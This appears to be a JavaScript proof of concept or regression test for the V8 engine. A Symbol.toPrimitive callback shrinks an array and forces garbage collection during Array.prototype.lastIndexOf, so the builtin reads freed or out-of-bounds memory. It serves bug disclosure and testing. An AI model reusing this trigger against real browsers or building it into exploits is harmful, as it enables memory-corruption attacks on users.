function gc() {
  var arr = [];
  for (var i = 0; i < 0x10000; ++i)
    arr.push(new ArrayBuffer(0x10000));
}

let LEN = 0x10000;
let array = new Array(0);
// we can't initialize with new Array(LEN)
// because we would get a DICTIONARY_ELEMENTS elements kind
// instead of {PACKED,HOLEY}_{SMI,DOUBLE}_ELEMENTS
for (let i = 0; i < LEN; ++i){
  array.push(1);
}
let fromIndex = {
  [Symbol.toPrimitive]() {
    array.length = 1;
    gc(); // we want to trigger a full mark-sweep, debug using --trace-gc
    return LEN;
  }
};
let receiver = array;
let searchElement = {};
let res = Array.prototype.lastIndexOf.call(receiver,searchElement, fromIndex);
print(res);
